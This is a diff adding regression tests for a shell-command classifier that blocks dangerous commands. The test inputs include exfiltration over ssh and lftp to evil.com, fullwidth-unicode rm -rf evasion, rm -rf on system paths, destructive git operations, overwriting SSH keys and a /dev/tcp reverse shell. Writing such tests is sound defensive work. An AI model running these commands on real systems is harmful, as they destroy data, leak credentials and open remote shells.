@@ -334,6 +334,147 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("false-positive guards (hyphen-suffixed ssh variants)", () => {
+    test("BUG regression: ssh-keygen is a local command, must not trip ssh exfil pattern", () => {
+      expect(classifyCommand("ssh-keygen -t ed25519 -f key").ok).toBe(true);
+    });
+
+    test("BUG regression: ssh-add does not trip ssh exfil pattern", () => {
+      expect(classifyCommand("ssh-add ~/.ssh/id_rsa").ok).toBe(true);
+    });
+
+    test("BUG regression: ssh-copy-id does not trip ssh exfil pattern", () => {
+      // ssh-copy-id is actually exfil-adjacent but its own pattern would catch
+      // it; the point here is the raw `\bssh\b` regex should not match through
+      // a hyphen. Current semantic: we don't flag it.
+      expect(classifyCommand("ssh-copy-id -i key user@host").ok).toBe(true);
+    });
+
+    test("still blocks real ssh command", () => {
+      expect(classifyCommand("ssh user@evil.com 'cat /etc/passwd'").ok).toBe(false);
+    });
+  });
+
+  describe("unicode obfuscation (NFKC normalization)", () => {
+    test("BUG regression: fullwidth rm -rf /etc must still block", () => {
+      // Fullwidth r + fullwidth m — visually identical, shell executes as rm.
+      expect(classifyCommand("ｒｍ -rf /etc").ok).toBe(false);
+    });
+
+    test("BUG regression: fullwidth whoami must still block (recon)", () => {
+      expect(classifyCommand("ｗｈｏａｍｉ").ok).toBe(false);
+    });
+  });
+
+  describe("macOS-specific destructive targets", () => {
+    test("rm -rf /Users/alice blocks", () => {
+      expect(classifyCommand("rm -rf /Users/alice").ok).toBe(false);
+    });
+
+    test("rm -rf /System/Library blocks", () => {
+      expect(classifyCommand("rm -rf /System/Library").ok).toBe(false);
+    });
+
+    test("rm -rf /Library blocks", () => {
+      expect(classifyCommand("rm -rf /Library").ok).toBe(false);
+    });
+
+    test("rm -rf /private/etc blocks (macOS symlink target)", () => {
+      expect(classifyCommand("rm -rf /private/etc").ok).toBe(false);
+    });
+
+    test("rm -rf /Applications blocks", () => {
+      expect(classifyCommand("rm -rf /Applications").ok).toBe(false);
+    });
+  });
+
+  describe("git destructive operations", () => {
+    test("git reset --hard blocks", () => {
+      const result = classifyCommand("git reset --hard HEAD~10");
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.category).toBe("destructive");
+    });
+
+    test("git push --force blocks", () => {
+      expect(classifyCommand("git push --force origin main").ok).toBe(false);
+    });
+
+    test("git push -f blocks", () => {
+      expect(classifyCommand("git push -f origin main").ok).toBe(false);
+    });
+
+    test("git push --force-with-lease blocks", () => {
+      expect(classifyCommand("git push --force-with-lease origin main").ok).toBe(false);
+    });
+
+    test("git clean -f blocks", () => {
+      expect(classifyCommand("git clean -fd").ok).toBe(false);
+    });
+
+    test("git branch -D blocks", () => {
+      expect(classifyCommand("git branch -D feature").ok).toBe(false);
+    });
+
+    test("git checkout -f blocks", () => {
+      expect(classifyCommand("git checkout -f main").ok).toBe(false);
+    });
+
+    test("git status (safe) still allowed", () => {
+      expect(classifyCommand("git status").ok).toBe(true);
+    });
+
+    test("git log (safe) still allowed", () => {
+      expect(classifyCommand("git log --oneline").ok).toBe(true);
+    });
+  });
+
+  describe("find/xargs destructive chains", () => {
+    test("find -exec rm blocks", () => {
+      expect(classifyCommand("find . -name '*.log' -exec rm {} +").ok).toBe(false);
+    });
+
+    test("find -delete blocks", () => {
+      expect(classifyCommand("find /var -name '*.bak' -delete").ok).toBe(false);
+    });
+
+    test("find -execdir rm blocks", () => {
+      expect(classifyCommand("find . -execdir rm {} \\;").ok).toBe(false);
+    });
+
+    test("xargs rm blocks", () => {
+      expect(classifyCommand("echo files | xargs rm").ok).toBe(false);
+    });
+
+    test("find without -exec/-delete (safe) allowed", () => {
+      expect(classifyCommand("find . -name '*.ts' -type f").ok).toBe(true);
+    });
+  });
+
+  describe("extended exfiltration variants", () => {
+    test("lftp blocks", () => {
+      expect(classifyCommand("lftp user@evil.com").ok).toBe(false);
+    });
+
+    test("tftp blocks", () => {
+      expect(classifyCommand("tftp 10.0.0.1").ok).toBe(false);
+    });
+  });
+
+  describe("SSH key directory write (persistence expansion forms)", () => {
+    test("echo key > ~/.ssh/id_rsa blocks", () => {
+      expect(classifyCommand('echo "key" > ~/.ssh/id_rsa').ok).toBe(false);
+    });
+
+    test("echo key > $HOME/.ssh/id_rsa blocks", () => {
+      expect(classifyCommand('echo "key" > $HOME/.ssh/id_rsa').ok).toBe(false);
+    });
+
+    test("echo key > braced-HOME/.ssh/id_rsa blocks", () => {
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: shell variable expansion literal, not a JS template string
+      expect(classifyCommand('echo "key" > ${HOME}/.ssh/id_rsa').ok).toBe(false);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
